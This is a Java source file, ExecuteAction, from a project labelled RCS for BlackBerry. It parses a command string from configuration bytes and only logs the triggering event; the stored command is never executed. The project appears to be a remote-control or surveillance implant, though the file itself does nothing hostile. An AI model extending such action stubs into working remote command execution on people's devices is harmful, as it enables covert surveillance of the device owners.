//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ExecuteAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.event.Event;
import blackberry.utils.Check;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public final class ExecuteAction extends SubAction {

    private String command;
    /**
     * Instantiates a new execute action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public ExecuteAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        String eventName = "NULL";
        if (triggeringEvent != null) {
            eventName = triggeringEvent.toString();
        }

        //#ifdef DEBUG_INFO
        debug.info("Execute. Event: " + eventName);

        //#endif
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        // estrarre la stringa.
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            int len = databuffer.readInt();
            byte[] buffer = new byte[len];
            databuffer.read(buffer);
            command = WChar.getString(buffer, true);           

        } catch (final EOFException e) {

            return false;
        }
        
        //#ifdef DEBUG_INFO
        debug.info("command: " + command);
        
        //#endif
        return true;
    }

}
